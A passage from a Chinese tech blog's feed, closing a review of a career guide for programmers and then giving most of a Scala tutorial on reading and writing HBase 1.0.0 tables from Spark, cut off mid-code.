&lt;p&gt;学会观察技术趋势真是说的容易做到难。未来总是难以预测的，在没有足够的技术敏感性的时候，就看看技术大牛们都在用什么吧。对于应届生来说，书中提到「可以选择一些得到大量投资的行业，通常而言，他们代表了未来的发展方向，比如云计算、大数据、移动互联网、智能硬件、共享经济、互联网金融等」。&lt;/p&gt;
&lt;p&gt;投资新兴市场和细分市场方面书中讲了几个例子，有个例子是如果应聘了乌云平台PHP开发工程师，那么「在乌云工作几个月以后，你就能写出来可能是国内最安全的PHP代码…这就是细分市场，比你懂安全的没你懂PHP、比你懂PHP的没你懂安全」。&lt;/p&gt;
&lt;h2 id=&quot;树立个人品牌&quot;&gt;&lt;a href=&quot;#树立个人品牌&quot; class=&quot;headerlink&quot; title=&quot;树立个人品牌&quot;&gt;&lt;/a&gt;树立个人品牌&lt;/h2&gt;&lt;p&gt;长辈总是劝戒我们要低调做人，但是程序员应该高调树立个人品牌。原因我就不说了，看书去吧。关键是如何树立个人品牌？&lt;/p&gt;
&lt;p&gt;书中列了以下几个建议：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;GitHub帐号，不解释&lt;/li&gt;
&lt;li&gt;技术博客&lt;/li&gt;
&lt;li&gt;微博，最好能加V，用于业内交流&lt;/li&gt;
&lt;li&gt;技术社区帐号，比如StackOverflow&lt;/li&gt;
&lt;li&gt;开源项目&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;其实，关键就是「分享」二字。「平时遇到的大小问题可以零星发在微博上。相对大量的内容，可以写成文章发在博客上。比较系统的内容，可以在相应文章的基础上整理成迷你书」。个人觉得不错的内容可以提交到&lt;a href=&quot;http://toutiao.io/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;开发者头条&lt;/a&gt;和&lt;a href=&quot;http://geek.csdn.net/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;CSDN极客头条&lt;/a&gt;，借助平台来推广。博客的内容质量是最重要的，只要你持续分享高质量的干货，就不愁没有读者。&lt;/p&gt;
&lt;p&gt;开源项目是重磅杀器。很多人认为开始开源项目很难，其实只是不敢迈出第一步而已。找一些自己在在项目时遇到的费时费事的小细节做好，然后开源就可以了。或者用自己新学的语言造个自己感兴趣的轮子，然后开源。或者用开源的形式做一个应用。我自己最近也在做一个开源应用，贵在实践。&lt;/p&gt;
&lt;h2 id=&quot;总结&quot;&gt;&lt;a href=&quot;#总结&quot; class=&quot;headerlink&quot; title=&quot;总结&quot;&gt;&lt;/a&gt;总结&lt;/h2&gt;&lt;p&gt;本书主要分为原理篇、准备篇、操作篇。推荐好好读读准备篇，会有很多收获。对于正在找工作的同学，操作篇也是非常实用的。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;半年前我就有幸拜读了&lt;a href=&quot;http://weibo.com/easy&quot;&gt;@Easy&lt;/a&gt;的&lt;a href=&quot;https://selfstore.io/products/190&quot;&gt;《程序员跳槽全攻略》&lt;/a&gt;电子书，当时趁着限免机智地入手了。当晚一口气读完后感觉收获颇丰，随手就发了篇&lt;a href=&quot;http://weibo.com/2176287895/BAQPPgAmA?from=page_1005052176287895_profile&amp;amp;wvr=6&amp;amp;mod=weibotime&quot;&gt;微博&lt;/a&gt;正能量了出去。在前几天的下午，又看到Easy为庆祝纸书上架发布了&lt;a href=&quot;http://weibo.com/p/1001603839169511193437&quot;&gt;百人试读活动&lt;/a&gt;。以我的性格当然果断就报名啦。&lt;/p&gt;
&lt;p&gt;刚拿到纸书的第一印象是“哇，好薄啊！”，不过浓缩的都是精华。这更像是一本迷你武林秘籍，在你练功遇到瓶颈时，拿出这本小册子读一读，说不定就找到了突破的方式。纸书与电子书在内容上的差别不大，主要是调整了目录的结构，加了些插图和tips。虽然是第二次读这本书，也有一些新的收获，所以就写了篇文章记录下。&lt;/p&gt;
    
    </summary>
    
      <category term="读书笔记" scheme="http://wuchong.me/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="读书" scheme="http://wuchong.me/tags/%E8%AF%BB%E4%B9%A6/"/>
    
  </entry>
  
  <entry>
    <title>Spark 下操作 HBase（1.0.0 新 API）</title>
    <link href="http://wuchong.me/blog/2015/04/06/spark-on-hbase-new-api/"/>
    <id>http://wuchong.me/blog/2015/04/06/spark-on-hbase-new-api/</id>
    <published>2015-04-06T15:36:32.000Z</published>
    <updated>2016-03-08T12:18:06.000Z</updated>
    
    <content type="html">&lt;p&gt;HBase经过七年发展，终于在今年2月底，发布了 1.0.0 版本。这个版本提供了一些让人激动的功能，并且，在不牺牲稳定性的前提下，引入了新的API。虽然 1.0.0 兼容旧版本的 API，不过还是应该尽早地来熟悉下新版API。并且了解下如何与当下正红的 Spark 结合，进行数据的写入与读取。鉴于国内外有关 HBase 1.0.0 新 API 的资料甚少，故作此文。&lt;/p&gt;
&lt;p&gt;本文将分两部分介绍，第一部分讲解使用 HBase 新版 API 进行 CRUD 基本操作；第二部分讲解如何将 Spark 内的 RDDs 写入 HBase 的表中，反之，HBase 中的表又是如何以 RDDs 形式加载进 Spark 内的。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;环境配置&quot;&gt;&lt;a href=&quot;#环境配置&quot; class=&quot;headerlink&quot; title=&quot;环境配置&quot;&gt;&lt;/a&gt;环境配置&lt;/h2&gt;&lt;p&gt;为了避免版本不一致带来不必要的麻烦，API 和 HBase环境都是 1.0.0 版本。HBase 为单机模式，分布式模式的使用方法类似，只需要修改&lt;code&gt;HBaseConfiguration&lt;/code&gt;的配置即可。&lt;/p&gt;
&lt;p&gt;开发环境中使用 SBT 加载依赖项&lt;br&gt;&lt;figure class=&quot;highlight groovy&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;name :&lt;/span&gt;= &lt;span class=&quot;string&quot;&gt;&quot;SparkLearn&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;version :&lt;/span&gt;= &lt;span class=&quot;string&quot;&gt;&quot;1.0&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;scalaVersion :&lt;/span&gt;= &lt;span class=&quot;string&quot;&gt;&quot;2.10.4&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;libraryDependencies += &lt;span class=&quot;string&quot;&gt;&quot;org.apache.spark&quot;&lt;/span&gt; %% &lt;span class=&quot;string&quot;&gt;&quot;spark-core&quot;&lt;/span&gt; % &lt;span class=&quot;string&quot;&gt;&quot;1.3.0&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;libraryDependencies += &lt;span class=&quot;string&quot;&gt;&quot;org.apache.hbase&quot;&lt;/span&gt; % &lt;span class=&quot;string&quot;&gt;&quot;hbase-client&quot;&lt;/span&gt; % &lt;span class=&quot;string&quot;&gt;&quot;1.0.0&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;libraryDependencies += &lt;span class=&quot;string&quot;&gt;&quot;org.apache.hbase&quot;&lt;/span&gt; % &lt;span class=&quot;string&quot;&gt;&quot;hbase-common&quot;&lt;/span&gt; % &lt;span class=&quot;string&quot;&gt;&quot;1.0.0&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;libraryDependencies += &lt;span class=&quot;string&quot;&gt;&quot;org.apache.hbase&quot;&lt;/span&gt; % &lt;span class=&quot;string&quot;&gt;&quot;hbase-server&quot;&lt;/span&gt; % &lt;span class=&quot;string&quot;&gt;&quot;1.0.0&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&quot;HBase-的-CRUD-操作&quot;&gt;&lt;a href=&quot;#HBase-的-CRUD-操作&quot; class=&quot;headerlink&quot; title=&quot;HBase 的 CRUD 操作&quot;&gt;&lt;/a&gt;HBase 的 CRUD 操作&lt;/h2&gt;&lt;p&gt;新版 API 中加入了 &lt;code&gt;Connection&lt;/code&gt;，&lt;code&gt;HAdmin&lt;/code&gt;成了&lt;code&gt;Admin&lt;/code&gt;，&lt;code&gt;HTable&lt;/code&gt;成了&lt;code&gt;Table&lt;/code&gt;，而&lt;code&gt;Admin&lt;/code&gt;和&lt;code&gt;Table&lt;/code&gt;只能通过&lt;code&gt;Connection&lt;/code&gt;获得。&lt;code&gt;Connection&lt;/code&gt;的创建是个重量级的操作，由于&lt;code&gt;Connection&lt;/code&gt;是线程安全的，所以推荐使用单例，其工厂方法需要一个&lt;code&gt;HBaseConfiguration&lt;/code&gt;。&lt;br&gt;&lt;figure class=&quot;highlight kotlin&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;val&lt;/span&gt; conf&lt;/span&gt; = HBaseConfiguration.create()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;conf.&lt;span class=&quot;keyword&quot;&gt;set&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;hbase.zookeeper.property.clientPort&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;2181&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;conf.&lt;span class=&quot;keyword&quot;&gt;set&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;hbase.zookeeper.quorum&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;master&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//Connection 的创建是个重量级的工作，线程安全，是操作hbase的入口&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;val&lt;/span&gt; conn&lt;/span&gt; = ConnectionFactory.createConnection(conf)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&quot;创建表&quot;&gt;&lt;a href=&quot;#创建表&quot; class=&quot;headerlink&quot; title=&quot;创建表&quot;&gt;&lt;/a&gt;创建表&lt;/h3&gt;&lt;p&gt;使用&lt;code&gt;Admin&lt;/code&gt;创建和删除表&lt;br&gt;&lt;figure class=&quot;highlight pf&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;val &lt;span class=&quot;keyword&quot;&gt;user&lt;/span&gt;Table = TableName.valueOf(&lt;span class=&quot;string&quot;&gt;&quot;user&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;//创建 &lt;span class=&quot;keyword&quot;&gt;user&lt;/span&gt; 表&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;val &lt;span class=&quot;built_in&quot;&gt;table&lt;/span&gt;Descr = new HTableDescriptor(&lt;span class=&quot;keyword&quot;&gt;user&lt;/span&gt;Table)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;table&lt;/span&gt;Descr.addFamily(new HColumnDescriptor(&lt;span class=&quot;string&quot;&gt;&quot;basic&quot;&lt;/span&gt;.getBytes))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;println(&lt;span class=&quot;string&quot;&gt;&quot;Creating table `user`. &quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;if (admin.&lt;span class=&quot;built_in&quot;&gt;table&lt;/span&gt;Exists(&lt;span class=&quot;keyword&quot;&gt;user&lt;/span&gt;Table)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  admin.disableTable(&lt;span class=&quot;keyword&quot;&gt;user&lt;/span&gt;Table)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  admin.deleteTable(&lt;span class=&quot;keyword&quot;&gt;user&lt;/span&gt;Table)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;admin.createTable(&lt;span class=&quot;built_in&quot;&gt;table&lt;/span&gt;Descr)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;println(&lt;span class=&quot;string&quot;&gt;&quot;Done!&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&quot;插入、查询、扫描、删除操作&quot;&gt;&lt;a href=&quot;#插入、查询、扫描、删除操作&quot; class=&quot;headerlink&quot; title=&quot;插入、查询、扫描、删除操作&quot;&gt;&lt;/a&gt;插入、查询、扫描、删除操作&lt;/h3&gt;&lt;p&gt;HBase 上的操作都需要先创建一个操作对象&lt;code&gt;Put&lt;/code&gt;,&lt;code&gt;Get&lt;/code&gt;,&lt;code&gt;Delete&lt;/code&gt;等，然后调用&lt;code&gt;Table&lt;/code&gt;上的相对应的方法&lt;br&gt;&lt;figure class=&quot;highlight stylus&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;try&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;//获取 user 表&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  val &lt;span class=&quot;selector-tag&quot;&gt;table&lt;/span&gt; = conn.getTable(userTable)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  try&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;//准备插入一条 key 为 id001 的数据&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    val &lt;span class=&quot;selector-tag&quot;&gt;p&lt;/span&gt; = new Put(&lt;span class=&quot;string&quot;&gt;&quot;id001&quot;&lt;/span&gt;.getBytes)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;//为put操作指定 column 和 value （以前的 put.add 方法被弃用了）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;selector-tag&quot;&gt;p&lt;/span&gt;.addColumn(&lt;span class=&quot;string&quot;&gt;&quot;basic&quot;&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.getBytes&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.getBytes&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;wuchong&quot;&lt;/span&gt;.getBytes)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;//提交&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;selector-tag&quot;&gt;table&lt;/span&gt;.put(p)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;//查询某条数据&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    val g = new Get(&lt;span class=&quot;string&quot;&gt;&quot;id001&quot;&lt;/span&gt;.getBytes)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    val result = &lt;span class=&quot;selector-tag&quot;&gt;table&lt;/span&gt;.get(g)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    val value = Bytes.toString(result.getValue(&lt;span class=&quot;string&quot;&gt;&quot;basic&quot;&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.getBytes&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;name&quot;&lt;/span&gt;.getBytes))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    println(&lt;span class=&quot;string&quot;&gt;&quot;GET id001 :&quot;&lt;/span&gt;+value)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;//扫描数据&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    val s = new Scan()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    s.addColumn(&lt;span class=&quot;string&quot;&gt;&quot;basic&quot;&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.getBytes&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;name&quot;&lt;/span&gt;.getBytes)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    val scanner = &lt;span class=&quot;selector-tag&quot;&gt;table&lt;/span&gt;.getScanner(s)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    try&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(r &amp;lt;- scanner)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        println(&lt;span class=&quot;string&quot;&gt;&quot;Found row: &quot;&lt;/span&gt;+r)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        println(&lt;span class=&quot;string&quot;&gt;&quot;Found value: &quot;&lt;/span&gt;+Bytes.toString(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          r.getValue(&lt;span class=&quot;string&quot;&gt;&quot;basic&quot;&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.getBytes&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;name&quot;&lt;/span&gt;.getBytes)))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;finally &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;comment&quot;&gt;//确保scanner关闭&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      scanner.close()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;//删除某条数据,操作方式与 Put 类似&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    val d = new Delete(&lt;span class=&quot;string&quot;&gt;&quot;id001&quot;&lt;/span&gt;.getBytes)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    d.addColumn(&lt;span class=&quot;string&quot;&gt;&quot;basic&quot;&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.getBytes&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;name&quot;&lt;/span&gt;.getBytes)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;selector-tag&quot;&gt;table&lt;/span&gt;.delete(d)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;finally &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;selector-tag&quot;&gt;table&lt;/span&gt; != null) &lt;span class=&quot;selector-tag&quot;&gt;table&lt;/span&gt;.close()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;finally &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  conn.close()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&quot;Spark-操作-HBase&quot;&gt;&lt;a href=&quot;#Spark-操作-HBase&quot; class=&quot;headerlink&quot; title=&quot;Spark 操作 HBase&quot;&gt;&lt;/a&gt;Spark 操作 HBase&lt;/h2&gt;&lt;h3 id=&quot;写入-HBase&quot;&gt;&lt;a href=&quot;#写入-HBase&quot; class=&quot;headerlink&quot; title=&quot;写入 HBase&quot;&gt;&lt;/a&gt;写入 HBase&lt;/h3&gt;&lt;p&gt;首先要向 HBase 写入数据，我们需要用到&lt;code&gt;PairRDDFunctions.saveAsHadoopDataset&lt;/code&gt;。因为 HBase 不是一个文件系统，所以&lt;code&gt;saveAsHadoopFile&lt;/code&gt;方法没用。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;def saveAsHadoopDataset(conf: JobConf): Unit&lt;/code&gt;&lt;br&gt;Output the RDD to any Hadoop-supported storage system, using a Hadoop JobConf object for that storage system&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这个方法需要一个 JobConf 作为参数，类似于一个配置项，主要需要指定输出的格式和输出的表名。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Step 1：&lt;/strong&gt;我们需要先创建一个 JobConf。&lt;br&gt;&lt;figure class=&quot;highlight kotlin&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//定义 HBase 的配置&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;val&lt;/span&gt; conf&lt;/span&gt; = HBaseConfiguration.create()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;conf.&lt;span class=&quot;keyword&quot;&gt;set&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;hbase.zookeeper.property.clientPort&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;2181&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;conf.&lt;span class=&quot;keyword&quot;&gt;set&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;hbase.zookeeper.quorum&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;master&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//指定输出格式和输出表名&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;val&lt;/span&gt; jobConf&lt;/span&gt; = new JobConf(conf,this.getClass)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;jobConf.setOutputFormat(classOf[TableOutputFormat])&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;jobConf.&lt;span class=&quot;keyword&quot;&gt;set&lt;/span&gt;(TableOutputFormat.OUTPUT_TABLE,&lt;span class=&quot;string&quot;&gt;&quot;user&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Step 2：&lt;/strong&gt; RDD 到表模式的映射&lt;br&gt;在 HBase 中的表 schema 一般是这样的：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;row     cf:col_1    cf:col_2
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;而在Spark中，我们操作的是RDD元组，比如&lt;code&gt;(1,&amp;quot;lilei&amp;quot;,14)&lt;/code&gt;, &lt;code&gt;(2,&amp;quot;hanmei&amp;quot;,18)&lt;/code&gt;。我们需要将 &lt;code&gt;RDD[(uid:Int, name:String, age:Int)]&lt;/code&gt; 转换成 &lt;code&gt;RDD[(ImmutableBytesWritable, Put)]&lt;/code&gt;。所以，我们定义一个 convert 函数做这个转换工作&lt;/p&gt;
&lt;figure class=&quot;highlight lasso&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;def convert(triple: (Int, &lt;span class=&quot;built_in&quot;&gt;String&lt;/span&gt;, Int)) = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      val p = &lt;span class=&quot;literal&quot;&gt;new&lt;/span&gt; Put(&lt;span class=&quot;built_in&quot;&gt;Bytes&lt;/span&gt;.toBytes(triple._1))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      p.addColumn(&lt;span class=&quot;built_in&quot;&gt;Bytes&lt;/span&gt;.toBytes(&lt;span class=&quot;string&quot;&gt;&quot;basic&quot;&lt;/span&gt;),&lt;span class=&quot;built_in&quot;&gt;Bytes&lt;/span&gt;.toBytes(&lt;span class=&quot;string&quot;&gt;&quot;name&quot;&lt;/span&gt;),&lt;span class=&quot;built_in&quot;&gt;Bytes&lt;/span&gt;.toBytes(triple._2))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      p.addColumn(&lt;span class=&quot;built_in&quot;&gt;Bytes&lt;/span&gt;.toBytes(&lt;span class=&quot;string&quot;&gt;&quot;basic&quot;&lt;/span&gt;),&lt;span class=&quot;built_in&quot;&gt;Bytes&lt;/span&gt;.toBytes(&lt;span class=&quot;string&quot;&gt;&quot;age&quot;&lt;/span&gt;),&lt;span class=&quot;built_in&quot;&gt;Bytes&lt;/span&gt;.toBytes(triple._3))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      (&lt;span class=&quot;literal&quot;&gt;new&lt;/span&gt; ImmutableBytesWritable, p)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;Step 3：&lt;/strong&gt; 读取RDD并转换&lt;br&gt;&lt;figure class=&quot;highlight kotlin&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//read RDD data from somewhere and convert&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;val&lt;/span&gt; rawData&lt;/span&gt; = List((&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;lilei&quot;&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;14&lt;/span&gt;), (&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;hanmei&quot;&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;18&lt;/span&gt;), (&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;someone&quot;&lt;/span&gt;,&lt;span 